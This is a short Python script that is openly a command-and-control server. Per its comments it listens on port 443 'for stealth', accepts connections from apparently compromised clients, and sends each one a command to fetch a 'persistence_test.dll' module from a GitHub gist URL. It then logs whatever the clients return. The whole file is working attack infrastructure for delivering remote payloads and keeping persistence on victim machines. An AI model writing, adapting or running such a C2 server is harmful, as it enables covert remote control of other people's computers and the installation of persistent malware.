#!/usr/bin/env python3
import socket
import threading
import time

# Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 443        # Standard HTTPS port for stealth

# Connected clients
clients = []

def handle_client(client_socket, client_address):
    print(f"[*] New connection from {client_address}")
    clients.append(client_socket)
    
    try:
        # Send test module command
        module_url = "https://gist.githubusercontent.com/FaZe0wNsJeW/TEST_GIST_ID/raw/persistence_test.dll"
        command = f"MODULE {module_url}"
        client_socket.send(command.encode())
        print(f"[*] Sent command to {client_address}: {command}")
        
        # Keep connection alive
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            print(f"[*] Received from {client_address}: {data.decode()}")
            
    except Exception as e:
        print(f"[!] Error handling client {client_address}: {e}")
    
    finally:
        print(f"[*] Connection closed with {client_address}")
        clients.remove(client_socket)
        client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    
    print(f"[*] C2 Server listening on {HOST}:{PORT}")
    
    while True:
        client, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client, addr))
        client_handler.start()

if __name__ == "__main__":
    main()